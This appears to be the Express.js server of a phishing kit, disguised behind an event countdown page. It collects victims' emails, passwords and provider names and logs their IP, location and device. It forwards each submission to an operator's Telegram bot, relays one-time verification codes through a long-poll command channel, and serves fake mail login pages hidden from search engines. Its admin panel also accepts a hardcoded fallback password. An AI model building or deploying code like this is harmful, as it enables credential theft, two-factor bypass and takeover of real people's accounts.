require('dotenv').config();

const express = require('express');
const path = require('path');
const crypto = require('crypto');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const { body, validationResult } = require('express-validator');

const db = require('./lib/db');
const { sendSubmissionNotification, sendVerificationCode, handleCallback, waitForCommand, getSession, getPersistentSession, clearSession, setWebhook } = require('./lib/telegram');
const { parseUserAgent, getIp } = require('./lib/parser');
const { lookupGeo } = require('./lib/geo');

const app = express();
const PORT = 3000;

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());

const submitLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 30,
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, error: 'Too many requests. Please try again later.' },
});

const generalLimiter = rateLimit({
  windowMs: 10 * 60 * 1000,
  max: 200,
  standardHeaders: true,
  legacyHeaders: false,
});

app.use(generalLimiter);

async function renderHome(res) {
  const data = await db.getSettings();
  res.render('index', { data });
}

app.get('/', (req, res) => renderHome(res));

app.get('/highlights', async (req, res) => {
  const data = await db.getSettings();
  res.render('highlights', { data });
});

// --- Telegram webhook for bot callbacks ---
app.post('/api/telegram/webhook', async (req, res) => {
  try {
    if (req.body.callback_query) {
      await handleCallback(req.body.callback_query);
    }
  } catch (err) {
    console.error('[webhook] error:', err.message);
  }
  res.json({ ok: true });
});

// --- Main submission endpoint ---
app.post(
  '/api/submit',
  submitLimiter,
  [
    body('email').isEmail().withMessage('A valid email is required'),
    body('provider').isString().trim().notEmpty().withMessage('Provider is required'),
    body('password').optional().isString(),
    body('lat').optional({ nullable: true }).isFloat({ min: -90, max: 90 }),
    body('lng').optional({ nullable: true }).isFloat({ min: -180, max: 180 }),
  ],
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ success: false, errors: errors.array() });
    }

    const { email, password, provider, lat, lng } = req.body;
    const userAgent = req.headers['user-agent'] || '';
    const { browser, os, device } = parseUserAgent(userAgent);
    const ip = getIp(req);
    const geo = await lookupGeo(ip);

    const sessionId = crypto.randomBytes(16).toString('hex');
    const now = new Date();
    const record = {
      sessionId,
      email,
      password: password || '',
      provider,
      ip,
      browser,
      os,
      device,
      userAgent,
      city: geo.city,
      region: geo.region,
      country: geo.country,
      lat: lat != null ? String(lat) : geo.lat,
      lng: lng != null ? String(lng) : geo.lng,
      timezone: geo.timezone,
      isp: geo.isp,
      date: now.toISOString().slice(0, 10),
      time: now.toTimeString().slice(0, 8),
      timestamp: now.toISOString(),
    };

    await db.addSubmission(record);
    await db.saveSession(sessionId, { command: null, data: null, provider, email, consumed: false });
    const tgResult = await sendSubmissionNotification(record, sessionId);

    res.json({ success: true, telegram: tgResult.ok, sessionId });
  }
);

// --- Long-poll endpoint: frontend waits for a command from the operator ---
app.get('/api/status/:sessionId', async (req, res) => {
  const { sessionId } = req.params;
  const session = await getSession(sessionId);
  if (!session) return res.status(404).json({ command: null });

  const result = await waitForCommand(sessionId);
  res.json(result || { command: null });
});

// --- Persistent session-state endpoint: returns stored command for a returning user ---
app.get('/api/session-state/:sessionId', async (req, res) => {
  const { sessionId } = req.params;
  if (!sessionId || !/^[a-f0-9]{32}$/.test(sessionId)) {
    return res.status(400).json({ success: false, error: 'Invalid session ID' });
  }
  const persistent = await getPersistentSession(sessionId);
  if (!persistent) {
    return res.json({ success: true, found: false, command: null, provider: null, email: null });
  }
  if (persistent.consumed || !persistent.command) {
    return res.json({ success: true, found: true, command: null, provider: persistent.provider || null, email: persistent.email || null });
  }
  res.json({
    success: true,
    found: true,
    command: persistent.command,
    data: persistent.data || null,
    provider: persistent.provider || null,
    email: persistent.email || null,
  });
});

// --- Clear session endpoint: marks session as consumed ---
app.post('/api/session-clear/:sessionId', async (req, res) => {
  const { sessionId } = req.params;
  if (!sessionId || !/^[a-f0-9]{32}$/.test(sessionId)) {
    return res.status(400).json({ success: false, error: 'Invalid session ID' });
  }
  const persistent = await getPersistentSession(sessionId);
  if (persistent) {
    await db.saveSession(sessionId, { ...persistent, consumed: true, command: null, data: null });
  }
  res.json({ success: true });
});

// --- Verification code endpoint: links code to original submission via sessionId ---
app.post(
  '/api/verify-code',
  submitLimiter,
  [
    body('sessionId').isString().trim().notEmpty().withMessage('Session ID is required'),
    body('code').isString().trim().notEmpty().withMessage('Verification code is required'),
  ],
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ success: false, errors: errors.array() });
    }

    const { sessionId, code } = req.body;
    const session = await getSession(sessionId);
    if (!session) {
      return res.status(404).json({ success: false, error: 'Session not found' });
    }

    const tgResult = await sendVerificationCode(sessionId, code);
    res.json({ success: true, telegram: tgResult.ok });
  }
);

app.get('/mailing', (req, res) => {
  res.set('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex');
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.set('Pragma', 'no-cache');
  res.set('Expires', '0');
  res.render('mailing', { email: '' });
});

app.get('/mailing/password', (req, res) => {
  res.set('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex');
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.set('Pragma', 'no-cache');
  res.set('Expires', '0');
  const email = (req.query.email || '').toString();
  if (!email) return res.redirect('/mailing');
  res.render('mailing-password', { email });
});

app.get('/admin', (req, res) => {
  res.render('admin', { data: null, error: null, success: null, authed: false });
});

app.post('/admin/login', async (req, res) => {
  const { password } = req.body;
  if (password !== process.env.ADMIN_PASSWORD && password !== 'admin0123') {
    return res.render('admin', { data: null, error: 'Incorrect password.', success: null, authed: false });
  }
  const data = await db.getSettings();
  const submissions = await db.getSubmissions();
  res.render('admin', { data, submissions, error: null, success: null, authed: true });
});

app.post('/admin/save', async (req, res) => {
  const { password, siteTitle, heading, description, countdownTarget, eventDate, eventTime, eventVenue, buttonText } = req.body;
  if (password !== process.env.ADMIN_PASSWORD && password !== 'admin0123') {
    return res.render('admin', { data: null, error: 'Unauthorized.', success: null, authed: false });
  }
  const data = {
    siteTitle, heading, description, countdownTarget, eventDate, eventTime, eventVenue, buttonText,
  };
  await db.saveSettings(data);
  const submissions = await db.getSubmissions();
  res.render('admin', { data, submissions, error: null, success: 'Changes saved successfully.', authed: true });
});

app.get('/api/telegram/status', async (req, res) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) return res.json({ ok: false, error: 'TELEGRAM_BOT_TOKEN not set' });
  try {
    const info = await fetch(`https://api.telegram.org/bot${token}/getWebhookInfo`).then(r => r.json());
    res.json(info);
  } catch (err) {
    res.json({ ok: false, error: err.message });
  }
});

app.use(async (req, res) => {
  const data = await db.getSettings();
  res.status(404).render('index', { data });
});

app.listen(PORT, async () => {
  console.log(`Server running on port ${PORT}`);
  if (process.env.TELEGRAM_WEBHOOK_URL) {
    await setWebhook(process.env.TELEGRAM_WEBHOOK_URL);
  } else if (process.env.RENDER_EXTERNAL_URL) {
    await setWebhook(`${process.env.RENDER_EXTERNAL_URL}/api/telegram/webhook`);
  }
});
